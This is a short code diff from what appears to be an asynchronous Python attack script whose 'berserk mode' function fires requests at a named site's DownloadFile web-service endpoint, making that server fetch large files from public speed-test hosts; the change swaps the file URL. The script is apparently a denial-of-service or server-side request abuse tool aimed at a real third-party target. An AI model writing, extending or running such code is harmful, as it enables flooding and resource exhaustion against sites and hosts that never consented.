@@ -20,7 +20,7 @@ async def send_request(session, task_id, url, payload, headers):
 
 async def start_berserk_mode():
     target_url = "https://app.rpscampus.in/Autocomplete.asmx/DownloadFile"
-    payload = {"FileUrl": "http://speedtest.tele2.net/1000GB.zip"}
+    payload = {"FileUrl": "https://nbg1-speed.hetzner.com/100MB.bin"}
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Vortex-Core-Berserk-1.0"
